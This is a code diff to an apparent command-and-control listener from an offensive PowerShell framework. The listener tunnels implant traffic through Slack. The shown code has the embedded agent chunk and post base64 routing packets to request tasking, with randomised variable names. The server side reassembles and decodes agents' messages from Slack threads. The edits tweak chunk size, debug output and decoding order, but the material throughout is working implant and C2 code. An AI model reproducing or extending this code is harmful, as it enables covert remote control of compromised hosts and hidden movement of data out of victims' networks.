@@ -499,7 +499,6 @@ class Listener:
                         }
 
                         if($waiting -eq $false) {
-                            Write-Host "Posting new request"
                             # meta 'TASKING_REQUEST' : 4
                             $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                             $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
@@ -561,7 +560,7 @@ class Listener:
                             $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
                             try {
-                                $Parts_to_send = $RoutingPacket_base64 -split "(.{3500})" | where {$_}
+                                $Parts_to_send = $RoutingPacket_base64 -split "(.{39000})" | where {$_}
 
                                 # send the header
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
@@ -592,6 +591,7 @@ class Listener:
                                             }
                                             #Try again and hope for the best
                                             else {
+                                                Write-Host "WebException caught, waiting..."
                                                 Start-Sleep -Seconds 5;
                                             }
                                         }
@@ -632,29 +632,6 @@ class Listener:
 
 
     def start_server(self, listenerOptions):
-
-        # utility function for handling commands
-        def get_data(thread_ts):
-
-            finished = False
-            while finished == False:
-                # get all the replies
-                replies = user_slack_client.api_call('channels.replies', channel=channel_id, thread_ts=thread_ts)
-
-                # check if --MESSAGE_END-- has been sent
-                data_return = ''
-                for msg in replies["messages"]:
-                    data_return += msg["text"]
-                    if msg["text"] == '--MESSAGE_END--':
-                        finished = True
-
-                #time.sleep(1)
-
-            # now we have all the data sent lets build it back to 
-            data_return = data_return.replace('--MESSAGE_START--','').replace('--MESSAGE_END--','')
-            data = base64.b64decode(data_return)
-
-            return data
 
         def parse_commands(slack_events,bot_id):
 
@@ -710,17 +687,16 @@ class Listener:
                             elif 'thread_ts' in message:
                                 agents = self.mainMenu.agents.agents
                                 thread_ids = filter(None, map((lambda x: get_agent_queue(agents[x])), agents))
-                                print thread_ids
                                 if message["thread_ts"] in thread_ids:
                                     agent_id, stage = message['username'].split(':')
                                     if agent_id not in agents:
                                         continue
                                     queue = agents[agent_id]['slack_queue']
                                     if message['text'] == '--MESSAGE_END--':
-                                        return_array.append((agent_id, stage, queue['data'], queue['thread_ts']))
+                                        return_array.append((agent_id, stage, base64.b64decode(queue['data']), queue['thread_ts']))
                                         agents[agent_id]['slack_queue'] = None
                                     else:
-                                        queue['data'] += (base64.b64decode(message['text']))
+                                        queue['data'] += message['text']
 
 
             #time.sleep(1)
